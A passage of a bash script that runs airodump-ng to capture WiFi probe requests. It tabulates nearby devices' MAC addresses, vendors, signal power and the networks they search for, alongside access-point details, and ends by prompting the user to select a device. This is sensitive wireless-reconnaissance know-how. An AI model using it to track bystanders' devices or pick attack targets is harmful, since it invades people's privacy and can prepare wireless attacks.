                        # Store probe count from CSV
                        device_ssid_counts["$key"]=$packets_count
                        
                        # Store device info
                        device_macs["$station_mac"]="$vendor"
                        # Store first seen time from CSV
                        device_first_seen["$station_mac"]="$first_seen_time"
                        # Store power from CSV
                        device_power["$station_mac"]="$power"
                    else
                        # For existing SSIDs, make sure device info is set
                        device_macs["$station_mac"]="$vendor"
                        # Update first seen time if not set
                        [[ -z "${device_first_seen[$station_mac]:-}" ]] && device_first_seen["$station_mac"]="$first_seen_time"
                        # Update power if not set
                        [[ -z "${device_power[$station_mac]:-}" ]] && device_power["$station_mac"]="$power"
                    fi
                fi
            done
        fi
    done < <(
        # Find the line number where the station list starts
        local station_start_line=$(grep -n "Station MAC" "$csv_file" | cut -d: -f1)
        
        if [[ -n "$station_start_line" ]]; then
            # Output only the station lines (skip header)
            tail -n +$((station_start_line + 1)) "$csv_file"
        fi
    )
}

update_ap_cache_from_airodump() {
    local csv_file="${AIRODUMP_FILE}-01.csv"
    
    if [[ ! -f "$csv_file" ]]; then
        return
    fi
    
    # Find the line number where the station list starts
    local station_start_line=$(grep -n "Station MAC" "$csv_file" | cut -d: -f1)
    
    if [[ -z "$station_start_line" ]]; then
        station_start_line=999999
    fi
    
    # Parse AP section using awk - similar to your working approach
    awk -F, -v station_line="$station_start_line" '
    NR >= station_line { exit }
    /BSSID/ { next }
    $1 ~ /:/ && $14 != "" {
        bssid = $1
        essid = $14
        channel = $4
        privacy = $6
        power = $9
        
        gsub(/^[[:space:]]+|[[:space:]]+$/, "", bssid)
        gsub(/^[[:space:]]+|[[:space:]]+$/, "", essid)
        gsub(/^[[:space:]]+|[[:space:]]+$/, "", channel)
        gsub(/^[[:space:]]+|[[:space:]]+$/, "", privacy)
        gsub(/^[[:space:]]+|[[:space:]]+$/, "", power)
        
        if (essid != "") {
            print essid "|" bssid "|" privacy "|" channel "|" power
        }
    }
    ' "$csv_file" | while IFS='|' read -r essid bssid privacy channel power; do
        [[ -z "$essid" ]] && continue
        
        # Decode if hex
        essid_decoded=$(decode_ssid_if_hex "$essid")
        
        # Update AP cache
        if [[ -n "$essid_decoded" && "$essid_decoded" != "<MISSING>" ]]; then
            ap_details_cache["$essid_decoded"]="${bssid}|${privacy}|${channel}|${power}"
        fi
    done
}

# Display function - shows devices probing for specific APs in table format with AP details
display_results() {
    clear
    echo -e "${ORANGE}======== WiFi Probe Monitor ========${RESET}"
    echo -e "${BOLD}Start time: $SCRIPT_START_TIME${RESET}\n\n"
    
    if [ ${#device_first_seen[@]} -eq 0 ]; then
        echo -e "${NEON_YELLOW}No devices probing for specific APs detected yet...${RESET}"
        echo -e "\n\n${CYAN}Press Ctrl+C to stop the scan and select a device${RESET}"
        return
    fi
    
    # Display header with AP details
    printf "${BOLD}%-3s %-18s %-43s %-8s %-8s %-28s %-18s %-10s %-9s %-11s %-30s${RESET}\n" \
        "#" "Device" "Device OUI" "Power" "Probes" "AP Name" "MAC" "AP power" "Channel" "Encryption" "AP OUI"
    echo "-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------"
    
    # Define color array for multiple AP devices
    local multi_ap_colors=("${NEON_GREEN}" "${NEON_PURPLE}" "${CYAN}" "${ORANGE}" "${RED}" "${BLUE}" "${NEON_YELLOW}" "${r_RED}" "${r_BLUE}" "${YELLOW}" "${r_GREEN}")
    
    # Create an associative array to track colors for each multi-AP device
    declare -A device_colors
    local color_index=0
    
    # First pass: assign colors to devices with multiple APs
    for dev in "${!device_first_seen[@]}"; do
        IFS='||' read -ra aps <<< "${device_ssids[$dev]}"
        local ap_count=${#aps[@]}
        if [[ $ap_count -gt 1 ]]; then
            device_colors["$dev"]="${multi_ap_colors[$color_index]}"
            color_index=$(( (color_index + 1) % ${#multi_ap_colors[@]} ))
        fi
    done
    
    # Sort devices by first-seen time (oldest first) and display with numbers
    local count=1
    for dev in $(for d in "${!device_first_seen[@]}"; do echo "${device_first_seen[$d]} $d"; done | sort | awk '{print $2}'); do
        vendor="${device_macs[$dev]}"
        power="${device_power[$dev]:--}"
        
        IFS='||' read -ra aps <<< "${device_ssids[$dev]}"
        local ap_count=${#aps[@]}
        
        # Get color for this device (if it has multiple APs)
        local device_color=""
        if [[ $ap_count -gt 1 ]]; then
            device_color="${device_colors[$dev]}"
        fi
        
        for ap in "${aps[@]}"; do
            [[ -n "$ap" && "$ap" != "1" ]] || continue
            key="${dev}_${ap}"
            probe_count="${device_ssid_counts[$key]:-0}"
            
            # Search for AP details in the airodump file
            ap_details=$(get_ap_details "$ap")
            
            # Extract AP details
            ap_mac=$(echo "$ap_details" | cut -d'|' -f1)
            ap_power=$(echo "$ap_details" | cut -d'|' -f2)
            ap_channel=$(echo "$ap_details" | cut -d'|' -f3)
            ap_encryption=$(echo "$ap_details" | cut -d'|' -f4)
            ap_vendor=$(echo "$ap_details" | cut -d'|' -f5)
            
            # Set empty values if AP not found
            [[ -z "$ap_mac" || "$ap_mac" == "Not Found" ]] && ap_mac=""
            [[ -z "$ap_power" ]] && ap_power=""
            [[ -z "$ap_channel" ]] && ap_channel=""
            [[ -z "$ap_encryption" ]] && ap_encryption=""
            [[ -z "$ap_vendor" ]] && ap_vendor=""
            
            # Color the device MAC based on whether it probes for multiple APs
            if [[ -n "$device_color" ]]; then
                printf "%-3s ${device_color}%-18s${RESET} %-43s %-8s %-8s %-28s %-18s %-10s %-9s %-11s %-30s\n" \
                    "${count})" "$dev" "$vendor" "$power" "$probe_count" "$ap" "$ap_mac" "$ap_power" "$ap_channel" "$ap_encryption" "$ap_vendor"
            else
                printf "%-3s %-18s %-43s %-8s %-8s %-28s %-18s %-10s %-9s %-11s %-30s\n" \
                    "${count})" "$dev" "$vendor" "$power" "$probe_count" "$ap" "$ap_mac" "$ap_power" "$ap_channel" "$ap_encryption" "$ap_vendor"
            fi
            
            ((count++))
        done
    done
    
    echo -e "\n\n${CYAN}Press Ctrl+C to stop the scan and select a device${RESET}"
}

# Function to get AP details from airodump file
get_ap_details() {
    local ap_essid="$1"
    local csv_file="${AIRODUMP_FILE}-01.csv"
    
    if [[ ! -f "$csv_file" ]]; then
        echo "||||"
        return
    fi
    
    # Find the line number where the station list starts (to know where AP section ends)
    local station_start_line=$(grep -n "Station MAC" "$csv_file" | cut -d: -f1)
    
    if [[ -z "$station_start_line" ]]; then
        station_start_line=999999
    fi
    
    # Search for AP in the AP section of the CSV
    local ap_line=$(awk -F, -v target_essid="$ap_essid" -v station_line="$station_start_line" '
    NR >= station_line { exit }
    /BSSID/ { next }
    $1 ~ /:/ {
        # Field 14 is ESSID, but we need to clean it
        essid = $14
        gsub(/^[[:space:]]+|[[:space:]]+$/, "", essid)
        gsub(/,$/, "", essid)  # Remove trailing comma if present
        
        if (essid == target_essid) {
            bssid = $1
            channel = $4
            encryption = $6
            power = $9
            
            gsub(/^[[:space:]]+|[[:space:]]+$/, "", bssid)
            gsub(/^[[:space:]]+|[[:space:]]+$/, "", channel)
            gsub(/^[[:space:]]+|[[:space:]]+$/, "", encryption)
            gsub(/^[[:space:]]+|[[:space:]]+$/, "", power)
            
            print bssid "|" power "|" channel "|" encryption
            exit
        }
    }
    ' "$csv_file")
    
    if [[ -n "$ap_line" ]]; then
        # Extract BSSID from the AP line to get vendor
        local ap_bssid=$(echo "$ap_line" | cut -d'|' -f1)
        local ap_vendor=""
        
        if [[ -n "$ap_bssid" && "$ap_bssid" != "Not Found" ]]; then
            # Normalize MAC and get vendor
            local ap_bssid_norm=$(normalize_mac "$ap_bssid")
            ap_vendor=$(get_vendor "$ap_bssid_norm")
            [[ -z "$ap_vendor" ]] && ap_vendor=""
        else
            ap_vendor=""
        fi
        
        echo "${ap_line}|${ap_vendor}"
    else
        echo "||||"
    fi
}

# Main execution
check_oui
install_dependencies
adapter_config
start_airodump_scan

clear
echo "${ORANGE}Starting probe requests monitoring via airodump-ng on ${NEON_GREEN}$WIFI_ADAPTER${ORANGE}...${RESET}"
echo "${ORANGE}Airodump-ng PID: $AIRODUMP_PID${RESET}"
echo "${ORANGE}Output file: ${AIRODUMP_FILE}-01.csv${RESET}"
echo "${ORANGE}Display will update every 5 seconds${RESET}"
echo

# Main monitoring loop
while true; do
    # Parse probe requests from airodump output
    parse_probe_requests
    
    # Update AP cache from airodump output
    update_ap_cache_from_airodump
    
    # Display results
    display_results
    
    # Wait 5 seconds before next update
    sleep 5
done
